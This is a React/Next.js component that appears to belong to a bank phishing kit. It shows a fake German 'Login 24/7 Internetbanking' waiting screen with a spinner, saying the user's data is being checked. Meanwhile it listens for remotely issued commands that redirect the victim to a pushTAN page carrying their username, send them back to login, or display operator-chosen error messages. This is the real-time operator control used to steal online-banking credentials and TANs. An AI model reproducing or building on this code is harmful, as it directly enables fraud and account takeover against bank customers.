"use client";

import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import { onCommand } from "@/lib/track";

export default function WaitingScreen({ user }: { user: string }) {
  const router = useRouter();
  const [error, setError] = useState<string | null>(null);

  useEffect(() => {
    onCommand((cmd) => {
      switch (cmd.type) {
        case "forward_to_tan":
          router.push(
            `/pushtan?code=${encodeURIComponent(String(cmd.payload?.code ?? ""))}&user=${encodeURIComponent(user)}`
          );
          break;
        case "back_to_login":
          router.push("/");
          break;
        case "show_error":
          setError(
            (cmd.payload?.message as string) || "Ein Fehler ist aufgetreten."
          );
          break;
        case "clear_error":
          setError(null);
          break;
      }
    });
    return () => onCommand(() => {});
  }, [router, user]);

  return (
    <>
      {/* Header with logo */}
      <div className="login-header">
        <span className="sr-only">Firmenlogo</span>
        <div id="topbar" className="topbar pre-login">
          <div className="container">
            <div className="row">
              <div className="topbar-logo"></div>
            </div>
          </div>
        </div>
      </div>

      {/* Main waiting area */}
      <div className="leave-header-visible" id="overlaycontainer-login">
        <div id="loginform" className="login-pin-column">
          <div id="modaloverlay" className="modal show" role="dialog">
            <div className="modal-dialog">
              <div className="modal-content">
                {/* Modal Header */}
                <div className="modal-header">
                  <h1>Login 24/7 Internetbanking</h1>
                </div>

                {/* Modal Body */}
                <div className="modal-body">
                  {/* Error banner */}
                  {error && (
                    <div
                      className="messages-overlay"
                      style={{ paddingBottom: 0 }}
                    >
                      <div
                        style={{
                          backgroundColor: "#fef2f2",
                          border: "1px solid #fecaca",
                          borderRadius: 4,
                          padding: "12px 16px",
                          color: "#b91c1c",
                          fontSize: 14,
                          lineHeight: 1.5,
                          fontFamily: "Arial, Helvetica, sans-serif",
                        }}
                      >
                        {error}
                      </div>
                    </div>
                  )}

                  {/* Spinner + waiting text */}
                  <div
                    style={{
                      display: "flex",
                      flexDirection: "column",
                      alignItems: "center",
                      justifyContent: "center",
                      padding: "50px 15px 40px",
                    }}
                  >
                    {/* CSS Spinner */}
                    <div
                      style={{
                        width: 48,
                        height: 48,
                        border: "4px solid #dedede",
                        borderTopColor: "#0066cc",
                        borderRadius: "50%",
                        animation: "waiting-spin 0.8s linear infinite",
                        marginBottom: 24,
                      }}
                    />
                    <p
                      style={{
                        fontFamily: "Arial, Helvetica, sans-serif",
                        fontSize: 18,
                        fontWeight: 500,
                        color: "#333333",
                        margin: "0 0 8px",
                        textAlign: "center",
                      }}
                    >
                      Ihre Daten werden {"ü"}berpr{"ü"}ft...
                    </p>
                    <p
                      style={{
                        fontFamily: "Arial, Helvetica, sans-serif",
                        fontSize: 14,
                        color: "#8c8c8c",
                        margin: 0,
                        textAlign: "center",
                      }}
                    >
                      Bitte warten Sie...
                    </p>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Spinner keyframes */}
      <style>{`
        @keyframes waiting-spin {
          to { transform: rotate(360deg); }
        }
      `}</style>
    </>
  );
}
